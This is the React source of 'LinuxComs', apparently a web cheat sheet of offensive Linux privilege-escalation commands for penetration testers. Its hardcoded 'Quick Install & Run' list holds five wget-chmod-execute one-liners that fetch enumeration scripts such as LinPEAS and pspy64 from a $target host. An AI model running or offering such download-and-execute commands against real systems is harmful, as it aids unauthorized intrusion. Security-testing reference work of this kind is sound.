import React, { useState, useMemo, useEffect } from "react";
import {
  Copy,
  Check,
  Star,
  Terminal,
  Download,
  Zap,
  GitBranch,
} from "lucide-react";
import data from "./data.json"; // ← Data loaded from src/data.json

// ─────────────────────────────────────────────────────────────
// AUTO TOOLS (Quick Install & Run)
// ─────────────────────────────────────────────────────────────
const autoToolsData = [
  {
    id: "t1",
    name: "LinPEAS",
    command:
      "wget http://$target/linpeas.sh -O linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh",
  },
  {
    id: "t2",
    name: "LSE (Linux Smart Enum)",
    command:
      "wget http://$target/lse.sh -O lse.sh && chmod +x lse.sh && ./lse.sh -l2",
  },
  {
    id: "t3",
    name: "LinEnum",
    command:
      "wget https://$target/LinEnum.sh -O linenum.sh && chmod +x linenum.sh && ./linenum.sh",
  },
  {
    id: "t4",
    name: "PSPY64 (Process Monitor)",
    command:
      "wget http://$target/pspy64 -O pspy64 && chmod +x pspy64 && timeout 5m ./pspy64",
  },
  {
    id: "t5",
    name: "SUID3NUM",
    command:
      "wget http://$target/suid3num.py -O suid3num.py && chmod +x suid3num.py && python3 suid3num.py",
  },
];

export default function App() {
  const [searchTerm, setSearchTerm] = useState("");
  const [starCount, setStarCount] = useState(1337);

  // Read selected tags from URL hash
  const getTagsFromHash = () => {
    const hash = window.location.hash.replace(/^#/, "");
    if (!hash) return [];
    return hash.split("+").filter(Boolean).map(decodeURIComponent);
  };

  const [selectedTags, setSelectedTags] = useState(getTagsFromHash());
  const [copiedId, setCopiedId] = useState(null);

  // Fetch real GitHub star count
  useEffect(() => {
    fetch("https://api.github.com/repos/LinuxComs/linuxcoms.github.io")
      .then((res) => res.json())
      .then((repo) => {
        if (repo.stargazers_count !== undefined)
          setStarCount(repo.stargazers_count);
      })
      .catch(() => {});
  }, []);

  // Sync tags with URL hash
  useEffect(() => {
    const handleHashChange = () => setSelectedTags(getTagsFromHash());
    window.addEventListener("hashchange", handleHashChange);
    return () => window.removeEventListener("hashchange", handleHashChange);
  }, []);

  const toggleTag = (tag) => {
    const newTags = selectedTags.includes(tag)
      ? selectedTags.filter((t) => t !== tag)
      : [...selectedTags, tag];

    setSelectedTags(newTags);

    const newHash =
      newTags.length > 0
        ? "#" + newTags.map((t) => "+" + encodeURIComponent(t)).join("")
        : "";

    window.history.pushState(null, null, newHash || window.location.pathname);
  };

  // Filter commands based on selected tags + search term
  const filteredData = useMemo(() => {
    return data.commands.filter((item) => {
      const matchesTags = selectedTags.every((tag) => item.tags.includes(tag));

      const searchLower = searchTerm.toLowerCase();
      const matchesSearch =
        item.description.toLowerCase().includes(searchLower) ||
        item.command.toLowerCase().includes(searchLower) ||
        item.tags.some((tag) => tag.toLowerCase().includes(searchLower));

      return matchesTags && matchesSearch;
    });
  }, [searchTerm, selectedTags]);

  const handleCopy = (id, command) => {
    navigator.clipboard.writeText(command);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  return (
    <div className="min-h-screen bg-[#2b2d31] text-gray-300 font-sans selection:bg-yellow-500/30">
      <div className="max-w-5xl mx-auto px-6 py-10">
        {/* HEADER */}
        <header className="flex items-center justify-between mb-8">
          <div className="flex items-center gap-4">
            <h1 className="text-4xl font-bold text-gray-100 tracking-tight">
              Linux<span className="text-yellow-500">Coms</span>
            </h1>
          </div>

          {/* GitHub + Star */}
          <div className="flex items-center gap-3">
            <a
              href="https://github.com/LinuxComs/linuxcoms.github.io"
              target="_blank"
              rel="noopener noreferrer"
              className="text-gray-400 hover:text-white transition-colors"
              title="GitHub Repository"
            >
              <GitBranch size={26} />
            </a>

            <a
              href="https://github.com/LinuxComs/linuxcoms.github.io"
              target="_blank"
              rel="noopener noreferrer"
              className="flex items-center gap-2 bg-[#1e1f22] border border-gray-600 hover:border-gray-400 text-sm px-4 py-1.5 rounded hover:bg-gray-700 transition-colors"
              title="Star on GitHub"
            >
              <Star size={16} className="text-yellow-400" />
              <span className="font-semibold text-gray-100">{starCount}</span>
            </a>
          </div>
        </header>

        {/* INTRO TEXT */}
        <div className="flex justify-between items-start gap-8 mb-10">
          <div className="space-y-4 text-[15px] leading-relaxed text-gray-400 max-w-3xl">
            <p>
              LinuxComs is an interactive cheat sheet, containing a curated list
              of offensive security tools and their respective commands, to be
              used against Linux environments.
            </p>
            <p>
              If you hate constantly looking up the right command to use to
              escalate privileges (like me), this project should help ease the
              pain a bit. Just select what information you currently have
              related to the Linux machine (SUID binaries, sudo permissions,
              cron jobs, etc.), and it will display a list of tools you can try
              against the machine, along with a template command for easy
              copy/pasting. See the full list of{" "}
              <span className="text-yellow-500">items</span> and{" "}
              <span className="text-yellow-500">filters</span>.
            </p>
            <p className="text-sm text-gray-500 pt-2">
              This project was inspired by{" "}
              <a
                href="https://wadcoms.github.io/"
                target="_blank"
                rel="noopener noreferrer"
                className="text-yellow-500 hover:underline"
              >
                WADComs
              </a>
              .
            </p>
          </div>

          <div className="hidden md:flex items-center justify-center w-32 h-32 bg-yellow-500/20 text-yellow-500 rounded-full flex-shrink-0 shadow-lg">
            <Terminal size={64} strokeWidth={1.5} />
          </div>
        </div>

        {/* AUTO TOOLS */}
        <div className="mb-12 bg-[#1e1f22] border border-yellow-500/30 rounded-md overflow-hidden">
          <div className="bg-yellow-500/10 px-4 py-3 border-b border-yellow-500/20 flex items-center gap-2">
            <Zap size={18} className="text-yellow-500" />
            <h3 className="font-bold text-yellow-500 uppercase tracking-wide text-sm">
              Quick Install &amp; Run Tools
            </h3>
          </div>
          <div className="p-4 grid grid-cols-1 md:grid-cols-2 gap-4">
            {autoToolsData.map((tool) => (
              <div key={tool.id} className="flex flex-col gap-1">
                <span className="text-xs font-semibold text-gray-400 flex items-center gap-1">
                  <Download size={12} /> {tool.name}
                </span>
                <div className="relative bg-[#111214] border border-gray-700/50 rounded-sm flex items-stretch group overflow-hidden">
                  <code className="flex-1 p-2 px-3 text-[13px] text-yellow-400/90 font-mono overflow-x-auto whitespace-nowrap hide-scrollbar">
                    {tool.command}
                  </code>
                  <button
                    onClick={() => handleCopy(tool.id, tool.command)}
                    className="px-3 text-gray-500 hover:text-yellow-400 transition-colors border-l border-gray-700/50"
                    title="Copy to clipboard"
                  >
                    {copiedId === tool.id ? (
                      <Check size={16} className="text-green-500" />
                    ) : (
                      <Copy size={16} />
                    )}
                  </button>
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* FILTER CATEGORIES */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-x-8 gap-y-8 mb-10">
          {Object.entries(data.categories).map(([categoryName, tags]) => (
            <div key={categoryName} className="flex flex-col items-start">
              <h3 className="font-bold text-gray-200 mb-3">{categoryName}</h3>
              <div className="flex flex-wrap justify-start gap-2">
                {tags.map((tag) => {
                  const isSelected = selectedTags.includes(tag);
                  return (
                    <button
                      key={tag}
                      onClick={() => toggleTag(tag)}
                      className={`px-3 py-1 text-sm rounded border transition-all ${
                        isSelected
                          ? "bg-yellow-500/20 border-yellow-500 text-yellow-400 font-semibold"
                          : "bg-transparent border-gray-600 text-gray-400 hover:border-yellow-500/50 hover:text-yellow-500"
                      }`}
                    >
                      {tag}
                    </button>
                  );
                })}
              </div>
            </div>
          ))}
        </div>

        {/* SEARCH BAR */}
        <div className="relative mb-12">
          <input
            type="text"
            placeholder={`Search among ${data.commands.length} commands: <command> +<filter> ...`}
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="w-full bg-white text-gray-900 text-[15px] px-4 py-3 rounded-sm shadow-md focus:outline-none focus:ring-2 focus:ring-yellow-500 placeholder-gray-500 font-medium"
          />
        </div>

        {/* COMMAND LIST */}
        <div className="space-y-6">
          <h2 className="text-xl font-bold text-gray-200 mb-4">Commands</h2>

          {filteredData.length > 0 ? (
            filteredData.map((item) => (
              <div key={item.id} className="flex flex-col gap-2 mb-6">
                <p className="text-sm text-gray-400 mb-1">{item.description}</p>

                <div className="relative bg-[#1e1f22] border border-gray-700 rounded-sm flex items-stretch group overflow-hidden">
                  <code className="flex-1 p-4 text-[15px] text-yellow-400 font-mono overflow-x-auto whitespace-pre-wrap hide-scrollbar font-medium leading-relaxed">
                    {item.command}
                  </code>
                  <button
                    onClick={() => handleCopy(item.id, item.command)}
                    className="px-4 text-gray-400 hover:text-yellow-400 transition-colors flex items-center justify-center flex-shrink-0 border-l border-gray-700 bg-[#1e1f22]"
                    title="Copy to clipboard"
                  >
                    {copiedId === item.id ? (
                      <Check size={20} className="text-green-500" />
                    ) : (
                      <Copy size={20} />
                    )}
                  </button>
                </div>

                <div className="flex flex-wrap gap-2 mt-1">
                  {item.tags.map((tag) => (
                    <span
                      key={tag}
                      className="text-[13px] border border-gray-600 text-green-500 px-2 py-0.5 rounded-sm bg-transparent"
                    >
                      {tag}
                    </span>
                  ))}
                </div>
              </div>
            ))
          ) : (
            <div className="text-center py-12 border border-dashed border-gray-600 rounded">
              <p className="text-gray-400 text-lg">
                No commands found matching your criteria.
              </p>
              <button
                onClick={() => {
                  setSearchTerm("");
                  setSelectedTags([]);
                  window.history.pushState(
                    null,
                    null,
                    window.location.pathname,
                  );
                }}
                className="mt-3 text-yellow-500 hover:underline font-medium"
              >
                Clear all filters
              </button>
            </div>
          )}
        </div>
      </div>

      {/* Global Styles */}
      <style
        dangerouslySetInnerHTML={{
          __html: `
            body { background-color: #2b2d31; margin: 0; padding: 0; }
            .hide-scrollbar::-webkit-scrollbar { display: none; }
            .hide-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
          `,
        }}
      />
    </div>
  );
}
